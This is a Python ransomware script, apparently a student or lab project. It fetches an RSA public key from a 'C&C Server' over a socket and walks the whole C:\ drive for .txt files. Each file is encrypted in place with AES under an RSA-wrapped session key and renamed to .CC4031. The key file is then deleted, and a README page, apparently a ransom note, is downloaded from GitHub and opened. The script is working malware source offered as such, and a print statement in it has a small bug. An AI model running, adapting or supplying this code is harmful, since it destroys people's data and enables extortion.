import os
import socket
import requests

from Crypto.PublicKey   import RSA
from Crypto.Cipher      import PKCS1_OAEP, AES
from Crypto.Random      import get_random_bytes
import webbrowser


IP_ADDRESS  = '127.0.0.1'
PORT        = 5678

def get_public_key():
    print('Creating socket...')
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        print('Connecting to C&C Server...')
        s.connect((IP_ADDRESS, PORT))

        s.send('public_key required!'.encode())
        print('Retrieving public_key.pem...')
        public_key = s.recv(1024)

        with open('public_key.pem', 'wb') as public_key_file:
            public_key_file.write(public_key)
        s.close()
    print('Done Retrieving: public_key.pem')

def get_file_paths(encrypted_extensions):
    file_paths = []
    for root, _, files in os.walk('C:\\'):
        for file in files:
            _, file_extension = os.path.splitext(root+'\\'+file)
            if file_extension in encrypted_extensions:
                file_paths.append(root+'\\'+file)
    print('Done Getting File Paths')
    return file_paths

def encrypt(file_path, public_key_file):
    try:
        with open(file_path, 'rb') as file:
            data = file.read()

        with open (public_key_file, 'rb') as pk_file: 
            key = RSA.import_key(pk_file.read())

        session_key = get_random_bytes(16)

        cipher = PKCS1_OAEP.new(key)
        encrypted_session_key = cipher.encrypt(session_key)

        cipher = AES.new(session_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(data)

        with open(file_path, 'wb') as file:
            [ file.write(x) for x in (encrypted_session_key, cipher.nonce, tag, ciphertext) ]
    
        file_name, _ = os.path.splitext(file_path)
        os.rename(file_path, file_name + '.CC4031')
        print('# of file:' + len(file_paths))
        print('Done Encrypting: ' + file_path)
    
    except:
        pass


get_public_key()
print('\n')
encrypted_extensions = ('.txt',)
file_paths = get_file_paths(encrypted_extensions)
print(len(file_paths))
print('\n')
for file_path in file_paths:
    encrypt(file_path, 'public_key.pem')
print('\n')
os.remove('public_key.pem')

url ='https://raw.githubusercontent.com/TelmoRibeiro/SdR-B/main/README.html'
r = requests.get(url, allow_redirects=True)
open('README.html', 'wb').write(r.content)
webbrowser.open_new_tab('README.html')